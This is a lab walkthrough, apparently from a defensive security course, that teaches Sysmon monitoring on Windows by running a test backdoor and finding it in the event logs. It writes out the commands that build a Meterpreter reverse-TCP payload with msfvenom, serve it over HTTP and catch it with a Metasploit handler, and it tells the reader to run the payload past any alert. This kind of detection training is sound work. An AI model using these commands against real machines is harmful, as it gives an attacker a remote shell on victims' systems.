
# Sysmon

MITRE Shield
------------

Applicable MITRE Shield techniques:
* [DTE0034](https://shield.mitre.org/techniques/DTE0034) - System Activity Monitoring
* [DTE0021](https://shield.mitre.org/techniques/DTE0021) - Hunting

Instructions
------------

First, let’s start up the ADHD Linux system and set up our malware and C2 listener:

Let's get started by opening a Terminal as Administrator

![](attachments\Clipboard_2020-06-12-10-36-44.png)

When you get the User Account Control Prompt, select Yes.

And, open a Ubuntu command prompt:

![](attachments\Clipboard_2020-06-17-08-32-51.png)

On your Linux system, please run the following command:

$`ifconfig`

![](attachments\Clipboard_2020-06-12-12-35-15.png)

Please note the IP address of your Ethernet adapter.

Please note that my adaptor is called eth0 and my IP address is 172.26.19.133.

Your IP Address and adapter name may be different.


Now, run the following commands to start a simple backdoor and backdoor listener:


$ `sudo su -`
Please note, the adhd password is adhd.

\#`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444
-f exe -o /tmp/TrustMe.exe`

\#`cd /tmp`

\#`ls -l TrustMe.exe`

\#`python -m SimpleHTTPServer 8000 &`

It should look like this:

![](attachments\Clipboard_2020-07-09-15-52-24.png)

Now, let's start the Metasploit Handler.  You will have to hit Enter to get your prompt back.


root@DESKTOP-I1T2G01:/tmp# `msfconsole -q`
msf5 > `use exploit/multi/handler`
msf5 exploit(multi/handler) > `set PAYLOAD windows/meterpreter/reverse_tcp`
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > `set LHOST 172.26.19.133`
Remember, your IP will be different!
msf5 exploit(multi/handler) > `exploit`

It should look like this:

![](attachments\Clipboard_2020-06-12-12-46-10.png)

Now, we will need to open an cmd.exe terminal as Administrator.


![](attachments\Clipboard_2020-06-12-10-36-44.png)

When you get the pop up select Yes.

Next, to open a Command Prompt Window, select the Down Carrot ![](attachments\Clipboard_2020-06-12-10-38-20.png) and then select Command Prompt.

![](attachments\Clipboard_2020-06-12-10-38-52.png)

Then, type the following:



C:\Windows\system32>`cd \Tools`

C:\Tools>`Sysmon64.exe -accepteula -i sysmonconfig-export.xml`


It should look like this:

![](attachments\Clipboard_2020-06-15-10-43-37.png)


Now, let’s surf to your Linux system, download the malware and run it!

Simply open an edge browser to `http://<YOUR LINUX IP>:8000`

![](attachments\Clipboard_2020-07-09-15-54-29.png)

Remember! Your IP will be different!!

Now, let's download and run the TrustMe.exe file!

![](attachments\Clipboard_2020-07-09-15-55-05.png)
You should simply click and run the program from the browser.

If you get an alert, just select run the application.

Back at your Ubuntu prompt, you should have a metasploit session!

![](attachments\Clipboard_2020-06-12-12-55-11.png)


Now, we need to view the Sysmon events for this malware:

You will select Event Viewer > Applications and Services Logs > Windows > Sysmon > Operational

![](attachments\Clipboard_2020-06-15-10-46-31.png)


        …………………………………………………………….

![](attachments\Clipboard_2020-06-15-10-47-01.png)


Start at the top and work down through the logs, you should see your malware executing.

![](attachments\Clipboard_2020-07-09-16-04-23.png)

![](attachments\Clipboard_2020-07-09-16-04-40.png)




















